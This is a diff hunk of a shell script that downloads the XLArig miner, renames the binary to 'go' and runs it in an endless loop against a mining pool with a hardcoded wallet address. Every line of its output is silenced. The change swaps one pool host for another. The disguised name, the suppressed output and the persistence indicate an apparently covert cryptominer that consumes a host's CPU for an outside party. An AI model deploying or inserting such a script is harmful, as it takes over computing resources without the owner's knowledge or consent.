@@ -13,7 +13,7 @@ wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.
 unzip XLArig-v5.2.2-linux-x86_64.zip > /dev/null 2>&1
 mv xlarig go > /dev/null 2>&1
 while [ 1 ]; do
-./go --cpu-priority 5 -a rx/0 -u 83qVLHdgsWhRNNFT6PQqWYRNMZ5xPQr1UDbpWiZeJEypWBh4EKco7Y6BoWjhz1x77Rii5CFtvtC3MVDwZmtcmW9H4DKkmsy -p Okbaahhh -o rx.unmineable.com:13333 --donate-level=0 --tls -donate-over-proxy=0 --cpu-no-yield  --randomx-mode=auto --randomx-1gb-pages > /dev/null 2>&1 
+./go --cpu-priority 5 -a rx/0 -u 83qVLHdgsWhRNNFT6PQqWYRNMZ5xPQr1UDbpWiZeJEypWBh4EKco7Y6BoWjhz1x77Rii5CFtvtC3MVDwZmtcmW9H4DKkmsy -p Okbaahhh -o xmr.2miners.com:13333 --donate-level=0 --tls -donate-over-proxy=0 --cpu-no-yield  --randomx-mode=auto --randomx-1gb-pages > /dev/null 2>&1 
 sleep 3
 done
 sleep 999 > /dev/null 2>&1
